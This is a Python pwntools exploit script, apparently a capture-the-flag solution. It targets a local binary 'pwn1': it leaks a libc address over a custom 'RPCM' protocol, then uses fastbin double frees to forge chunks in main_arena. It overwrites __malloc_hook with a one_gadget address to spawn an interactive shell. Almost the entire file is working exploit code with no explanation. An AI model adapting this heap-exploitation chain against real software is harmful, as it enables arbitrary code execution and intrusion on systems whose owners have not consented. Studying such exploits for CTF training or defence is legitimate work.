#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import struct
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"] 

#  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

p = lambda d: struct.pack(">i", d)

def chunk_add(size, cont):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Message: ", cont)

def chunk_list(idx):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("Index: ", str(idx))

def chunk_free(idx):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("Index: ", str(idx))

io = process("./pwn1", env = {"LD_PRELOAD": "./libc.so.6"})
#  io = process("./pwn1")
io.send("RPCM" + p(0) * 2)
io.send("RPCM" + p(0) + p(1))
io.send("RPCM" + p(0) + p(3))
io.recvn(4 * 7)
idx = io.recvn(32)
#  print idx
#  DEBUG([0x2953], True)
io.send(p(32) + idx + p(10) + '_GG_gG_Gg_' + p(10) + '_GG_gG_Gg_')
io.recvuntil("key: ")
libc.address = int(io.recvuntil("\n", drop = True), 16) - libc.sym['_IO_2_1_stdin_']
print hex(libc.address)
#  main_arena = 0x399b00 + libc.address
main_arena = 0x3c4b20 + libc.address
chunk_add(0x38, 'aaaa')
chunk_add(0x38, p64(0x0) * 5 + p64(0x61))
chunk_free(0) # 0
chunk_free(1) # 0 -> 1
chunk_free(0) # 0 -> 1 -> 0
chunk_add(0x38, p64(0x61)) # 1 -> 0 -> 0x61
chunk_add(0x38, 'aaaa') # 0 -> 0x61
chunk_add(0x38, 'bbbb') # 0x61

chunk_add(0x58, '0000')
chunk_add(0x58, '1111')
#  chunk_free(0)
#  chunk_free(1)
#  chunk_free(2)
#  chunk_free(3)
chunk_free(4)
chunk_free(3)
chunk_free(4)
chunk_add(0x58, p64(main_arena + 16))
chunk_add(0x58, 'aaaa')
chunk_add(0x58, 'aaaa')
chunk_add(0x58, '\0' * 56 + p64(libc.sym['__malloc_hook'] - 0x18) * 2 + p64(main_arena + 88) * 2)
#  DEBUG([0x3454, 0x3693], True)
one_gadget = libc.address + 0xf1147
#  DEBUG([0x3454, 0x3693], True)
chunk_add(0x20, p64(one_gadget) * 2)

io.sendlineafter(">> ", "1")
io.sendlineafter("Size: ", str(1))


io.interactive()
